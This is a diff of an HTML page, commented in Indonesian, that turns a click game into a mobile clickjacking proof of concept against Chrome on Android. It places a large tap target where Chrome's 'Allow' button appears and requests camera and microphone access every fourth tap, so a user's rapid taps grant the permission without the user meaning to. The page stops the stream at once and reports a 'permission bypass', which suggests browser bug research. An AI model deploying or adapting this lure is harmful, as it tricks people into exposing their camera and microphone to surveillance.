@@ -1,66 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Permission Clickjacking Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobile Clickjacking Test</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; overflow: hidden; }
-        #game-target {
-            width: 200px; height: 200px; background: radial-gradient(circle, #ff0000, #880000);
-            border-radius: 50%; margin: 50px auto; line-height: 200px; font-weight: bold;
-            cursor: pointer; user-select: none; transition: transform 0.1s;
+        body { 
+            margin: 0; padding: 0; background: #111; color: white; 
+            font-family: sans-serif; overflow: hidden; touch-action: none; 
         }
-        #game-target:active { transform: scale(0.9); }
-        .info { padding: 20px; color: #aaa; }
-        #log { font-family: monospace; color: #00ff00; margin-top: 20px; }
+        /* Tombol target yang posisinya kita samakan dengan tombol 'Allow' Chrome */
+        #target-button {
+            position: absolute;
+            bottom: 30%; /* Area umum prompt Chrome Android */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 85vw;
+            height: 120px;
+            background: linear-gradient(45deg, #ff0000, #990000);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            z-index: 10;
+        }
+        #score-board { margin: 20px; font-size: 18px; color: #55ff55; }
     </style>
 </head>
 <body>
 
-    <h2>Click Fast Game!</h2>
-    <p class="info">Click the red circle 20 times to win a prize!</p>
+    <div id="score-board">Taps Detected: <span id="score">0</span></div>
+    <div id="target-button">TAP CEPAT DI SINI!</div>
     
-    <div id="game-target">CLICK ME!</div>
-    <div id="score">Score: 0</div>
-    <div id="log"></div>
+    <div id="status" style="position:fixed; top:20px; width:100%; text-align:center; font-family:monospace;"></div>
 
     <script>
         let score = 0;
-        const target = document.getElementById('game-target');
+        const btn = document.getElementById('target-button');
         const scoreDisplay = document.getElementById('score');
-        const log = document.getElementById('log');
+        const status = document.getElementById('status');
 
-        target.addEventListener('click', () => {
+        // Pakai touchstart untuk respons instan di HP
+        btn.addEventListener('touchstart', (e) => {
+            e.preventDefault(); 
             score++;
-            scoreDisplay.innerText = "Score: " + score;
+            scoreDisplay.innerText = score;
 
-            // Trigger permission tepat saat user sedang aktif mengklik
-            // Kita coba di klik ke-5, ke-10, dan ke-15
-            if (score === 5 || score === 10 || score === 15) {
+            // Trigger prompt setiap 4 kali tap
+            if (score % 4 === 0) {
                 requestPermission();
-            }
-
-            if (score >= 20) {
-                target.innerText = "YOU WIN!";
-                target.style.background = "gold";
             }
         });
 
         async function requestPermission() {
-            log.innerText = "Status: Triggering Permission...";
+            status.innerText = "TRIGGERING PROMPT...";
             try {
-                // Minta akses kamera dan mikrofon sekaligus
+                // Minta video & audio untuk memperbesar ukuran prompt sistem
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                log.innerText = "CRITICAL: PERMISSION GRANTED!";
-                log.style.color = "red";
-                log.style.fontWeight = "bold";
                 
-                // Matikan kamera langsung setelah tes berhasil
+                // Jika baris di bawah ini muncul, berarti jari lo "tembus" ke tombol Allow
+                status.innerHTML = "<h2 style='color:red;'>BUG DETECTED: PERMISSION BYPASS!</h2>";
+                
+                // Stop kamera langsung setelah sukses
                 stream.getTracks().forEach(track => track.stop());
             } catch (err) {
-                log.innerText = "Status: Permission Denied (" + err.name + ")";
-                log.style.color = "#00ff00";
+                status.innerText = "Status: " + err.name;
             }
         }
     </script>
